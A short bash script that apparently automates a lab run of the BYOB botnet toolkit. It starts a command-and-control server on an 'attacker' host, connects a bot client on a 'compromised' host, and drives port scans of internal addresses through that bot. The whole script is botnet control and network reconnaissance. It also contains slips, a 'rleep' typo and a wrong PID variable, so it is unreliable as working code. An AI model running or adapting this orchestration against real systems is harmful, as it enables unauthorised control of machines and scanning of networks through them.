#!/bin/bash

set -x


remote_kill() {
    node=$1
    prog=$2
    ssh $node "sudo kill \$(ps -e | grep $prog | awk '{print \$1}')"
}



ssh attacker "cd ~/byob && ./server.py" &
attackerPid=$1

sleep 10 # let the server boot

ssh compromised "byob-client" &
compromisedPid=$!


rleep 5 # let the victim connect


ssh attacker "byossh -t 10 compromised portscanner 10.10.10.3 >> /tmp/port-results && cat /tmp/port-results"

sleep 5

ssh attacker "byossh -t 10 compromised portscanner 10.10.10.4 >> /tmp/port-results && cat /tmp/port-results"


sleep 8 # Make sure all the data downloads

